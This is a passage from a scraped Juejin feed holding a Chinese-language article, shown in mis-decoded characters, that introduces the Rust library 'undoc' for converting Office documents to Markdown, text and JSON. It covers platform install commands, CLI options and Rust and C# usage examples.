#c1c3d1;color:#666b85}.markdown-body table tr:hover td{background:#212122;color:#fff;border-top:1px solid #22262e}.markdown-body table tr:first-child{border-top:none}.markdown-body table tr:last-child{border-bottom:none}.markdown-body table tr:nth-child(odd) td{background:#f1f1f1}.markdown-body table tr:nth-child(odd):hover td{background:#212122}.markdown-body table tr:last-child td:first-child{border-bottom-left-radius:4px}.markdown-body table tr:last-child td:last-child{border-bottom-right-radius:4px}.markdown-body table td{background:#fbfbfb;padding:16px;text-align:left;vertical-align:middle;font-size:16px;border-right:1px solid #c1c3d1}.markdown-body table td:last-child{border-right:0}.markdown-body blockquote{color:#777;padding:1px 16px;margin:24px 0;border-left:4px solid #c6c4c4;background-color:#f1f1f1;transition:all .3s ease-out;border-radius:4px}.markdown-body blockquote:hover{border-left-color:#212122;background-color:#212122;color:#fff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:24px}.markdown-body ol li,.markdown-body ul li{margin-bottom:6px;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body span.math{margin-left:32px;font-size:18px;font-weight:700}@media (max-width:720px){.markdown-body h1{font-size:30.4px}.markdown-body h2{font-size:24px}.markdown-body h3{font-size:19.2px}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:12.8px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><h2 data-id="heading-0">ä¸€ã€å·¥å…·åŸºç¡€ä¿¡æ¯</h2>
<ol>
<li><strong>å®šä½</strong>ï¼šä¸€æ¬¾é«˜æ€§èƒ½ Rust åº“ï¼Œä¸»æ‰“ Microsoft Office æ–‡æ¡£ï¼ˆDOCXã€XLSXã€PPTXï¼‰å†…å®¹æå–ï¼Œæ”¯æŒè½¬æ¢ä¸ºå¤šç§æ ¼å¼ã€‚</li>
<li><strong>ç‰ˆæœ¬ä¸æ›´æ–°</strong>ï¼šå½“å‰ç‰ˆæœ¬ 0.1.10ï¼Œ2025 å¹´ 12 æœˆ 21 æ—¥å‘å¸ƒï¼›å†å²ç‰ˆæœ¬ä» 0.1.1 åˆ° 0.1.9ï¼Œå¤šé›†ä¸­åœ¨ 2025 å¹´ 12 æœˆ 20-21 æ—¥æ›´æ–°ï¼Œä¸”è‡ªå¸¦é€šè¿‡ GitHub Releases å®ç°çš„è‡ªæ›´æ–°æœºåˆ¶ï¼ˆå¯æ£€æŸ¥æ›´æ–°ã€æ›´æ–°åˆ°æœ€æ–°ç‰ˆã€å¼ºåˆ¶é‡è£…ï¼‰ã€‚</li>
<li><strong>æ–‡æ¡£è¦†ç›–ä¸è§„æ¨¡</strong>ï¼šæ–‡æ¡£è¦†ç›–ç‡ 91.49%ï¼ˆ235 ä¸ªé¡¹ç›®ä¸­ 215 ä¸ªæœ‰æ–‡æ¡£ï¼Œ38 ä¸ªé¡¹ç›®ä¸­ 14 ä¸ªå¸¦ç¤ºä¾‹ï¼‰ï¼›æºç å¤§å° 368.97 kBï¼Œæ–‡æ¡£å¤§å° 3.9 MBã€‚</li>
<li><strong>ä¾èµ–é¡¹</strong>ï¼šåŒ…å« quick-xmlï¼ˆ^0.37ï¼‰ã€rayonï¼ˆ^1.10ï¼‰ã€regexï¼ˆ^1.11ï¼‰ã€serdeï¼ˆ^1.0ï¼‰ã€serde_jsonï¼ˆ^1.0ï¼‰ã€thiserrorï¼ˆ^2.0ï¼‰ã€tokioï¼ˆ^1.42ï¼Œå¯é€‰ï¼‰ã€unicode-normalizationï¼ˆ^0.1ï¼‰ã€zipï¼ˆ^2.2ï¼‰ã€tempfileï¼ˆ^3.14ï¼‰ç­‰ã€‚</li>
<li><strong>æ‰€æœ‰æƒ</strong>ï¼šç”± iyulab-caveman ç»´æŠ¤ï¼Œä»“åº“åœ°å€ä¸º iyulab/undoc000ï¼Œå¯åœ¨ crates.io è·å–ã€‚</li>
</ol>
<h2 data-id="heading-1">äºŒã€æ ¸å¿ƒåŠŸèƒ½ç‰¹æ€§</h2>
<ol>
<li>
<p><strong>æ ¼å¼æ”¯æŒ</strong></p>
<ul>
<li><strong>è¾“å…¥æ ¼å¼</strong>ï¼šDOCXï¼ˆWordï¼‰ã€XLSXï¼ˆExcelï¼‰ã€PPTXï¼ˆPowerPointï¼‰ï¼Œå‡å·²å®ç°å®Œæ•´æ”¯æŒã€‚</li>
<li><strong>è¾“å‡ºæ ¼å¼</strong>ï¼šMarkdownï¼ˆå¸¦ç»“æ„åŒ–æ’ç‰ˆï¼Œå«æ ‡é¢˜ã€åˆ—è¡¨ã€è¡¨æ ¼ç­‰ï¼‰ã€Plain Textï¼ˆçº¯æ–‡æœ¬ï¼Œæ— æ ¼å¼æ ‡è®°ï¼‰ã€JSONï¼ˆå«å®Œæ•´å…ƒæ•°æ®ï¼Œå¦‚æ ‡é¢˜ã€ä½œè€…ã€åˆ›å»ºæ—¶é—´ç­‰ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>å†…å®¹å¤„ç†èƒ½åŠ›</strong></p>
<ul>
<li>ä¿ç•™æ–‡æ¡£ç»“æ„ï¼šåŒ…æ‹¬æ ‡é¢˜å±‚çº§ã€åˆ—è¡¨ï¼ˆæœ‰åº / æ— åºåŠåµŒå¥—ï¼‰ã€è¡¨æ ¼ã€è¡Œå†…æ ¼å¼ï¼ˆç²—ä½“ã€æ–œä½“ã€ä¸‹åˆ’çº¿ã€åˆ é™¤çº¿ï¼‰ã€‚</li>
<li>ä¸“é¡¹åŠŸèƒ½ï¼šPPTX è¡¨æ ¼å®Œæ•´è§£æã€CJK æ–‡æœ¬æ™ºèƒ½é—´è·ï¼ˆæ”¯æŒä¸­éŸ©æ—¥å†…å®¹ï¼‰ã€èµ„æºæå–ï¼ˆå›¾ç‰‡ã€å›¾è¡¨ã€åµŒå…¥å¼åª’ä½“ï¼‰ã€æ–‡æœ¬æ¸…ç†ï¼ˆå¤šé¢„è®¾ï¼Œé€‚é… LLM è®­ç»ƒæ•°æ®å‡†å¤‡ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>æŠ€æœ¯ä¼˜åŠ¿</strong>ï¼šåŸºäº Rayon å®ç°å¹¶è¡Œå¤„ç†ï¼ˆå¤šç« èŠ‚ / å·¥ä½œè¡¨ / å¹»ç¯ç‰‡ï¼‰ã€é€šè¿‡ quick-xml å®ç°é«˜æ•ˆ XML è§£æã€æ”¯æŒå¤§æ–‡æ¡£å†…å­˜é«˜æ•ˆå¤„ç†ï¼Œè¿˜æä¾› C-ABI FFIï¼ˆå¯ä½œä¸º C#ã€Python ç­‰è¯­è¨€çš„åŸç”Ÿåº“ï¼‰ã€‚</p>
</li>
</ol>
<h2 data-id="heading-2">ä¸‰ã€å®‰è£…æ–¹å¼</h2>
<h3 data-id="heading-3">ï¼ˆä¸€ï¼‰é¢„ç¼–è¯‘äºŒè¿›åˆ¶åŒ…ï¼ˆæ¨èï¼‰</h3>






























<table><thead><tr><th>å¹³å°</th><th>æ¶æ„</th><th>ä¸‹è½½ä¸å®‰è£…å‘½ä»¤</th></tr></thead><tbody><tr><td>Windows</td><td>x64</td><td>1. ä¸‹è½½ï¼š<code>Invoke-WebRequest -Uri "https://github.com/iyulab/undoc/releases/latest/download/undoc-cli-x86_64-pc-windows-msvc.zip" -OutFile "undoc.zip"</code>2. è§£å‹ï¼š<code>Expand-Archive -Path "undoc.zip" -DestinationPath "."</code>3. ï¼ˆå¯é€‰ï¼‰ç§»åŠ¨åˆ° PATH ç›®å½•ï¼š<code>Move-Item -Path "undoc.exe" -Destination "$env:LOCALAPPDATA\Microsoft\WindowsApps"</code>4. éªŒè¯ï¼š<code>undoc version</code></td></tr><tr><td>Linux</td><td>x64</td><td>1. ä¸‹è½½ï¼š<code>curl -LO https://github.com/iyulab/undoc/releases/latest/download/undoc-cli-x86_64-unknown-linux-gnu.tar.gz</code>2. è§£å‹ï¼š<code>tar -xzf undoc-cli-x86_64-unknown-linux-gnu.tar.gz</code>3. å®‰è£…ï¼š<code>sudo mv undoc /usr/local/bin/</code>ï¼ˆç³»ç»Ÿçº§ï¼‰æˆ–<code>mkdir -p ~/.local/bin &amp;&amp; mv undoc ~/.local/bin/ &amp;&amp; echo 'export PATH="$HOME/.local/bin:$PATH"' &gt;&gt; ~/.bashrc &amp;&amp; source ~/.bashrc</code>ï¼ˆç”¨æˆ·çº§ï¼‰4. éªŒè¯ï¼š<code>undoc version</code></td></tr><tr><td>macOS</td><td>Intel</td><td>1. ä¸‹è½½ï¼š<code>curl -LO https://github.com/iyulab/undoc/releases/latest/download/undoc-cli-x86_64-apple-darwin.tar.gz</code>2. è§£å‹ï¼š<code>tar -xzf undoc-cli-x86_64-apple-darwin.tar.gz</code>3. å®‰è£…ï¼š<code>sudo mv undoc /usr/local/bin/</code>4. éªŒè¯ï¼š<code>undoc version</code></td></tr><tr><td>macOS</td><td>Apple Siliconï¼ˆM1/M2/M3ï¼‰</td><td>1. ä¸‹è½½ï¼š<code>curl -LO https://github.com/iyulab/undoc/releases/latest/download/undoc-cli-aarch64-apple-darwin.tar.gz</code>2. è§£å‹ï¼š<code>tar -xzf undoc-cli-aarch64-apple-darwin.tar.gz</code>3. å®‰è£…ï¼š<code>sudo mv undoc /usr/local/bin/</code>4. éªŒè¯ï¼š<code>undoc version</code></td></tr></tbody></table>
<h3 data-id="heading-4">ï¼ˆäºŒï¼‰Cargo å®‰è£…ï¼ˆéœ€å·²å®‰è£… Rustï¼‰</h3>
<ul>
<li>å®‰è£… CLIï¼š<code>cargo install undoc-cli</code></li>
<li>é¡¹ç›®æ·»åŠ åº“ä¾èµ–ï¼š<code>cargo add undoc</code></li>
</ul>
<h2 data-id="heading-5">å››ã€ä½¿ç”¨æŒ‡å—</h2>
<h3 data-id="heading-6">ï¼ˆä¸€ï¼‰CLI å‘½ä»¤ä½¿ç”¨</h3>
<ol>
<li>
<p><strong>æ ¸å¿ƒå‘½ä»¤</strong></p>























































<table><thead><tr><th>å‘½ä»¤</th><th>åŠŸèƒ½</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>undoc &lt;file&gt; [output]</code></td><td>æå–æ‰€æœ‰æ ¼å¼ï¼ˆMarkdownã€æ–‡æœ¬ã€JSONï¼‰+ åª’ä½“åˆ°è¾“å‡ºç›®å½•ï¼ˆé»˜è®¤å‘½ä»¤ï¼‰</td><td><code>undoc document.docx ./output</code></td></tr><tr><td><code>undoc convert &lt;file&gt; [OPTIONS]</code></td><td>åŒé»˜è®¤å‘½ä»¤ï¼Œæ˜¾å¼æŒ‡å®šè½¬æ¢</td><td>-</td></tr><tr><td><code>undoc markdown/&lt;file&gt; [OPTIONS]</code>ï¼ˆåˆ«å<code>md</code>ï¼‰</td><td>ä»…è½¬æ¢ä¸º Markdown</td><td><code>undoc md document.docx --frontmatter -o report.md</code>ï¼ˆå¸¦ YAML å‰ç«¯ matterï¼‰</td></tr><tr><td><code>undoc text &lt;file&gt; [OPTIONS]</code></td><td>ä»…è½¬æ¢ä¸ºçº¯æ–‡æœ¬</td><td><code>undoc text document.docx --cleanup standard -o output.txt</code>ï¼ˆå¸¦æ–‡æœ¬æ¸…ç†ï¼‰</td></tr><tr><td><code>undoc json &lt;file&gt; [OPTIONS]</code></td><td>ä»…è½¬æ¢ä¸º JSON</td><td><code>undoc json document.docx --compact -o output.json</code>ï¼ˆç´§å‡‘ JSON æ ¼å¼ï¼‰</td></tr><tr><td><code>undoc info &lt;file&gt;</code></td><td>æ˜¾ç¤ºæ–‡æ¡£ä¿¡æ¯ï¼ˆæ ¼å¼ã€ç« èŠ‚æ•°ã€èµ„æºæ•°ã€æ ‡é¢˜ã€ä½œè€…ç­‰ï¼‰</td><td><code>undoc info document.docx</code></td></tr><tr><td><code>undoc extract &lt;file&gt; [OPTIONS]</code></td><td>ä»…æå–èµ„æºï¼ˆå›¾ç‰‡ç­‰ï¼‰</td><td><code>undoc extract presentation.pptx -o ./media</code></td></tr><tr><td><code>undoc update [OPTIONS]</code></td><td>è‡ªæ›´æ–°</td><td><code>undoc update --check</code>ï¼ˆæ£€æŸ¥æ›´æ–°ï¼‰</td></tr><tr><td><code>undoc version</code></td><td>æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯</td><td>-</td></tr></tbody></table>
</li>
<li>
<p><strong>Markdown è½¬æ¢å…³é”®é€‰é¡¹</strong></p>



































<table><thead><tr><th>é€‰é¡¹</th><th>æè¿°</th><th>é»˜è®¤å€¼</th></tr></thead><tbody><tr><td><code>-o, --output</code></td><td>è¾“å‡ºæ–‡ä»¶è·¯å¾„</td><td>stdoutï¼ˆæ ‡å‡†è¾“å‡ºï¼‰</td></tr><tr><td><code>-f, --frontmatter</code></td><td>åŒ…å« YAML å‰ç«¯ matter</td><td>false</td></tr><tr><td><code>--table-mode</code></td><td>è¡¨æ ¼æ¸²æŸ“æ¨¡å¼ï¼ˆ<code>markdown</code>/<code>html</code>/<code>ascii</code>ï¼‰</td><td>markdown</td></tr><tr><td><code>--cleanup</code></td><td>æ–‡æœ¬æ¸…ç†é¢„è®¾ï¼ˆ<code>minimal</code>/<code>standard</code>/<code>aggressive</code>ï¼‰</td><td>none</td></tr><tr><td><code>--max-heading</code></td><td>æœ€å¤§æ ‡é¢˜å±‚çº§ï¼ˆ1-6ï¼‰</td><td>6</td></tr></tbody></table>
</li>
<li>
<p><strong>æ‰¹é‡è½¬æ¢ç¤ºä¾‹</strong></p>
<ul>
<li>Shellï¼š<code>for f in *.docx; do undoc md "$f" -o "${f%.docx}.md"; done</code></li>
<li>PowerShellï¼š<code>Get-ChildItem *.docx | ForEach-Object { undoc md $_.FullName -o "$($_.BaseName).md" }</code></li>
</ul>
</li>
</ol>
<h3 data-id="heading-7">ï¼ˆäºŒï¼‰Rust åº“ä½¿ç”¨</h3>
<ol>
<li><strong>å¿«é€Ÿå¼€å§‹</strong></li>
</ol>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> undoc::{parse_file, render};
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> undoc::<span class="hljs-type">Result</span>&lt;()&gt; {
    <span class="hljs-comment">// è§£ææ–‡æ¡£</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">doc</span> = <span class="hljs-title function_ invoke__">parse_file</span>(<span class="hljs-string">"document.docx"</span>)?;
    <span class="hljs-comment">// è½¬æ¢ä¸ºMarkdown</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">options</span> = render::RenderOptions::<span class="hljs-title function_ invoke__">default</span>();
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">markdown</span> = render::<span class="hljs-title function_ invoke__">to_markdown</span>(&amp;doc, &amp;options)?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, markdown);
    <span class="hljs-comment">// è·å–çº¯æ–‡æœ¬</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">text</span> = render::<span class="hljs-title function_ invoke__">to_text</span>(&amp;doc, &amp;options)?;
    <span class="hljs-comment">// è·å–JSON</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">json</span> = render::<span class="hljs-title function_ invoke__">to_json</span>(&amp;doc, render::JsonFormat::Pretty)?;
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<ol start="2">
<li><strong>è‡ªå®šä¹‰æ¸²æŸ“é€‰é¡¹</strong></li>
</ol>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> undoc::render::{RenderOptions, CleanupPreset, TableFallback};
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">options</span> = RenderOptions::<span class="hljs-title function_ invoke__">new</span>()
    .<span class="hljs-title function_ invoke__">with_frontmatter</span>(<span class="hljs-literal">true</span>) <span class="hljs-comment">// å¸¦YAMLå‰ç«¯matter</span>
    .<span class="hljs-title function_ invoke__">with_table_fallback</span>(TableFallback::Html) <span class="hljs-comment">// è¡¨æ ¼ fallback ä¸ºHTML</span>
    .<span class="hljs-title function_ invoke__">with_cleanup_preset</span>(CleanupPreset::Aggressive) <span class="hljs-comment">// æ¿€è¿›æ–‡æœ¬æ¸…ç†</span>
    .<span class="hljs-title function_ invoke__">with_max_heading</span>(<span class="hljs-number">3</span>); <span class="hljs-comment">// æœ€å¤§æ ‡é¢˜å±‚çº§3</span>
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">markdown</span> = render::<span class="hljs-title function_ invoke__">to_markdown</span>(&amp;doc, &amp;options)?;
</code></pre>
<ol start="3">
<li><strong>æ–‡æ¡£ç»“æ„æ“ä½œ</strong>ï¼šå¯è®¿é—®å…ƒæ•°æ®ï¼ˆæ ‡é¢˜ã€ä½œè€…ã€åˆ›å»ºæ—¶é—´ï¼‰ã€è¿­ä»£ç« èŠ‚ä¸å…ƒç´ ã€æå–èµ„æºæ–‡ä»¶ã€‚</li>
<li><strong>æ ¼å¼æ£€æµ‹</strong>ï¼šæ”¯æŒä»æ–‡ä»¶è·¯å¾„ï¼ˆ<code>detect_format_from_path</code>ï¼‰æˆ–å­—èŠ‚æ•°ç»„ï¼ˆ<code>detect_format_from_bytes</code>ï¼‰æ£€æµ‹æ–‡æ¡£æ ¼å¼ã€‚</li>
</ol>
<h3 data-id="heading-8">ï¼ˆä¸‰ï¼‰C# /.NET é›†æˆ</h3>
<ol>
<li><strong>è·å–åŸç”Ÿåº“</strong>ï¼šä» GitHub Releases ä¸‹è½½ï¼ˆWindows x64 ä¸º<code>undoc.dll</code>ã€Linux x64 ä¸º<code>libundoc.so</code>ã€macOS ä¸º<code>libundoc.dylib</code>ï¼‰ï¼Œæˆ–é€šè¿‡<code>cargo build --release --features ffi</code>ä»æºç æ„å»ºã€‚</li>
<li><strong>C# åŒ…è£…å™¨ä½¿ç”¨</strong></li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-keyword">using</span> Undoc;
<span class="hljs-comment">// è§£æå¹¶è½¬æ¢ä¸ºMarkdown</span>
<span class="hljs-built_in">string</span> markdown = UndocNative.ToMarkdown(<span class="hljs-string">"document.docx"</span>);
<span class="hljs-comment">// è§£æå¹¶è½¬æ¢ä¸ºçº¯æ–‡æœ¬</span>
<span class="hljs-built_in">string</span> text = UndocNative.ToText(<span class="hljs-string">"document.docx"</span>);
<span class="hljs-comment">// è§£æå¹¶è½¬æ¢ä¸ºJSON</span>
<span class="hljs-built_in">string</span> json = UndocNative.ToJson(<span class="hljs-string">"document.docx"</span>);
<span class="hljs-comment">// ä»å­—èŠ‚æ•°ç»„è§£æ</span>
<span class="hljs-built_in">byte</span>[] data = File.ReadAllBytes(<span class="hljs-string">"document.docx"</span>);
<span class="hljs-built_in">string</span> markdown = UndocNative.ToMarkdownFromBytes(data);
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-meta">#![allow(warnings)]</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> std::error::Error&gt;&gt; {
    <span class="hljs-keyword">use</span> undoc::{to_json, render::JsonFormat};
    <span class="hljs-keyword">use</span> undoc::{parse_file, to_markdown};

    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">path</span> = <span class="hljs-string">"E:/demo.xlsx"</span>;

    <span class="hljs-comment">// Simple text extraction</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">text</span> = undoc::<span class="hljs-title function_ invoke__">extract_text</span>(path)?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, text);

    <span class="hljs-comment">// Convert to Markdown</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">markdown</span> = <span class="hljs-title function_ invoke__">to_markdown</span>(path)?;
    std::fs::<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-string">"output.md"</span>, markdown)?;


    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">json</span> = <span class="hljs-title function_ invoke__">to_json</span>(path, JsonFormat::Compact)?;
    std::fs::<span class="hljs-title function_ invoke__">write</span>(<span class="hljs-string">"output.json"</span>, json)?;

    <span class="hljs-comment">// Full parsing with access to structure</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">doc</span> = <span class="hljs-title function_ invoke__">parse_file</span>(path)?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Sections: {}"</span>, doc.sections.<span class="hljs-title function_ invoke__">len</span>());
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Resources: {}"</span>, doc.resources.<span class="hljs-title function_ invoke__">len</span>());
    <span class="hljs-title function_ invoke__">Ok</span>(())
}

</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[SpringCloudAlibaba]]></title>    <link>https://juejin.cn/post/7592483877986402310</link>    <guid>https://juejin.cn/post/7592483877986402310</guid>    <pubDate>2026-01-07T15:52:15.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592483877986402310" data-draft-id="7592159803411496996" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="SpringCloudAlibaba"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-07T15:52:15.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ihgry"/> <meta itemprop="url" content="https://juejin.cn/user/3210229685954718"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringCloudAlibaba
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3210229685954718/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ihgry
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-07T15:52:15.000Z" title="Wed Jan 07 2026 15:52:15 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-07
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    9
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 